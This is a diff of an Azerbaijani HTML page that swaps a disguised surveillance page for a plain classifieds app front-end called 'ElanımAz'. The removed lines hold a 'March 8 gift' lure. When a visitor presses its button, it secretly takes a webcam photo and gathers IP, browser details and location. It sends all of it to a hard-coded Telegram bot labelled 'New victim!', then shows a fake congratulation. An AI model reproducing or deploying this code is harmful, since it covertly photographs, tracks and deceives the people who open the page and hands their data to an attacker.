@@ -1,184 +1,158 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>8 Mart Sürprizi 🎀</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      background: linear-gradient(135deg, #ff9a9e, #fecfef);
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #333;
-    }
-    .card {
-      background: white;
-      border-radius: 24px;
-      padding: 40px 30px;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.2);
-      text-align: center;
-      max-width: 420px;
-      width: 90%;
-      animation: float 5s ease-in-out infinite;
-    }
-    @keyframes float {
-      0%,100% { transform: translateY(0); }
-      50%     { transform: translateY(-12px); }
-    }
-    h1 {
-      color: #e91e63;
-      font-size: 3rem;
-      margin: 0 0 20px;
-      text-shadow: 0 3px 15px rgba(233,30,99,0.3);
-    }
-    p {
-      font-size: 1.4rem;
-      margin: 0 0 35px;
-      line-height: 1.6;
-    }
-    button {
-      background: #ff4081;
-      color: white;
-      border: none;
-      padding: 18px 70px;
-      font-size: 1.5rem;
-      border-radius: 50px;
-      cursor: pointer;
-      box-shadow: 0 10px 30px rgba(255,64,129,0.4);
-      transition: all 0.3s ease;
-    }
-    button:hover {
-      background: #f50057;
-      transform: translateY(-4px);
-      box-shadow: 0 15px 40px rgba(245,0,87,0.5);
-    }
-    #video, #canvas {
-      display: none;
-    }
-    .success {
-      font-size: 2rem;
-      color: #4caf50;
-      margin-top: 30px;
-      opacity: 0;
-      animation: fadeIn 1.5s forwards;
-    }
-    @keyframes fadeIn {
-      to { opacity: 1; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ElanımAz</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
+        
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); 
+            color: white;
+            min-height: 100vh;
+            margin: 0;
+            padding-bottom: 120px; 
+        }
+
+        /* Yenilənmiş Səhifə Paneli - Daha uzun və tünd */
+        .nav-container {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            display: flex;
+            justify-content: space-around; /* Düymələri bərabər yayır */
+            width: 90%; /* Paneli daha uzun etdik */
+            max-width: 500px; /* Maksimum genişlik limiti */
+            background-color: rgba(15, 23, 42, 0.9); /* Qapalı tünd mavi */
+            backdrop-filter: blur(15px);
+            padding: 10px;
+            border-radius: 9999px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+
+        .button {
+            --border_radius: 9999px;
+            --transtion: 0.3s ease-in-out;
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex: 1; /* Düymələrin hər biri bərabər yer tutur */
+            padding: 0.8rem 0.5rem;
+            background-color: transparent;
+            border: none;
+            border-radius: var(--border_radius);
+            transition: transform var(--transtion);
+        }
+
+        /* Sənin orijinal animasiya effektlərin */
+        .button::after {
+            content: ""; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 90%; height: 100%; background-color: hsla(260 97% 61% / 0.75);
+            background-image: radial-gradient(at 51% 89%, hsla(266, 45%, 74%, 1) 0px, transparent 50%);
+            opacity: var(--active, 0); border-radius: var(--border_radius);
+            transition: opacity var(--transtion); z-index: 2;
+        }
+
+        .button:is(:hover, :focus-visible, .active) { --active: 1; }
+        
+        .button .dots_border {
+            --size_border: calc(100% + 2px); overflow: hidden; position: absolute;
+            top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 100%; height: 100%;
+            border-radius: var(--border_radius); z-index: -1;
+            opacity: var(--active, 0);
+        }
+
+        .button .dots_border::before {
+            content: ""; position: absolute; top: 30%; left: 50%; transform: translate(-50%, -50%);
+            width: 100%; height: 2rem; background-color: white;
+            mask: linear-gradient(transparent 0%, white 120%);
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate { to { transform: rotate(360deg); } }
+
+        .button .text_button {
+            position: relative; z-index: 10; color: white;
+            font-size: 0.85rem; font-weight: 600;
+        }
+
+        .page { display: none; padding: 20px; animation: fadeIn 0.4s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
 </head>
 <body>
 
-<div class="card">
-  <h1>8 Mart Hədiyyəsi! 💝</h1>
-  <p>Xüsusi sürpriz səni gözləyir...<br>Düyməni bas və hədiyyəni götür!</p>
-  
-  <button onclick="startCamera()">Hədiyyəni Götür</button>
-  
-  <div id="success" class="success">Hədiyyə alındı! 🎉 Gözəl qızsan 😘</div>
-</div>
+    <header class="py-12 text-center">
+        <h1 class="text-5xl font-extrabold tracking-tighter text-white drop-shadow-md">
+            ElanımAz
+        </h1>
+        <p class="text-blue-100 mt-2 opacity-80">Professional Elan Platforması</p>
+    </header>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+    <main class="max-w-md mx-auto">
+        <div id="elanlar" class="page active">
+            <div class="bg-white/10 backdrop-blur-md p-6 rounded-3xl border border-white/20">
+                <h2 class="text-xl font-bold mb-4 text-center">🔥 Son Elanlar</h2>
+                <div class="space-y-4">
+                    <div class="bg-white/5 p-4 rounded-2xl border border-white/10 text-center">Yaxın zamanda burada elanlar görünəcək.</div>
+                </div>
+            </div>
+        </div>
 
-<script>
-  const BOT_TOKEN = "8551654815:AAG0lD8TvpZqQeBIM-DcCH5d5cqgWpuMeUs";
-  const CHAT_ID   = "8055987590";
+        <div id="chat" class="page">
+            <div class="bg-white/10 backdrop-blur-md p-6 rounded-3xl border border-white/20">
+                <h2 class="text-xl font-bold mb-4 text-center">💬 Mesajlar</h2>
+                <p class="text-blue-100 text-center">Hələlik heç bir aktiv söhbət yoxdur.</p>
+            </div>
+        </div>
 
-  async function startCamera() {
-    try {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      
-      video.srcObject = stream;
-      video.play();
+        <div id="profil" class="page">
+            <div class="bg-white/10 backdrop-blur-md p-6 rounded-3xl border border-white/20 text-center">
+                <div class="w-20 h-20 bg-indigo-600 rounded-full mx-auto mb-4 flex items-center justify-center text-2xl font-bold border-4 border-white/30">
+                    EA
+                </div>
+                <h2 class="text-xl font-bold mb-1">Mənim Profilim</h2>
+                <p class="text-blue-200 text-sm italic">Profil məlumatlarınız burada əks olunacaq.</p>
+            </div>
+        </div>
+    </main>
 
-      // 3 saniyə gözlə, sonra şəkil çək
-      setTimeout(async () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    <div class="nav-container">
+        <button id="btn-elanlar" class="button active" onclick="showPage('elanlar')">
+            <span class="dots_border"></span>
+            <span class="text_button">Elanlar</span>
+        </button>
 
-        const photo = canvas.toDataURL('image/jpeg');
+        <button id="btn-chat" class="button" onclick="showPage('chat')">
+            <span class="dots_border"></span>
+            <span class="text_button">Chat</span>
+        </button>
 
-        // IP və digər məlumatları topla
-        let ip = "gizli";
-        try {
-          const ipRes = await fetch("https://api.ipify.org?format=json");
-          const ipData = await ipRes.json();
-          ip = ipData.ip || "gizli";
-        } catch {}
+        <button id="btn-profil" class="button" onclick="showPage('profil')">
+            <span class="dots_border"></span>
+            <span class="text_button">Profilim</span>
+        </button>
+    </div>
 
-        const userAgent = navigator.userAgent;
-        const platform  = navigator.platform;
-        const language  = navigator.language;
-        const screen    = `${screen.width}x${screen.height}`;
-        const time      = new Date().toLocaleString("az-AZ");
+    <script>
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
 
-        let location = "gizli";
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(pos => {
-            location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-          }, () => {});
+            document.querySelectorAll('.button').forEach(b => b.classList.remove('active'));
+            document.getElementById('btn-' + pageId).classList.add('active');
         }
-
-        const message = 
-`Yeni qurban!
-IP: ${ip}
-User-Agent: ${userAgent}
-Platforma: ${platform}
-Dil: ${language}
-Ekran: ${screen}
-Vaxt: ${time}
-Konum: ${location}
-Şəkil aşağıdadır 👇`;
-
-        // Şəkli Telegram-a göndər (multipart/form-data ilə)
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("caption", message);
-        formData.append("photo", dataURLtoBlob(photo), "photo.jpg");
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-
-        // Kameranı söndür
-        stream.getTracks().forEach(track => track.stop());
-
-        // Saxta təbrik ekrana çıxar
-        document.querySelector('.card').innerHTML = `
-          <div style="font-size:3rem;color:#4caf50;">Hədiyyə alındı! 🎉💖</div>
-          <p style="font-size:1.6rem;margin-top:30px;">Çox gözəlsən, 8 Martın mübarək! 😘</p>
-        `;
-
-      }, 3000); // 3 saniyə gözlə
-
-    } catch (err) {
-      alert("Kamera icazəsi verilmədi və ya xəta baş verdi 😔");
-      console.error(err);
-    }
-  }
-
-  // DataURL-ni Blob-a çevir (Telegram üçün lazımdır)
-  function dataURLtoBlob(dataURL) {
-    const arr = dataURL.split(',');
-    const mime = arr[0].match(/:(.*?);/)[1];
-    const bstr = atob(arr[1]);
-    let n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    while (n--) {
-      u8arr[n] = bstr.charCodeAt(n);
-    }
-    return new Blob([u8arr], { type: mime });
-  }
-</script>
+    </script>
 
 </body>
 </html>
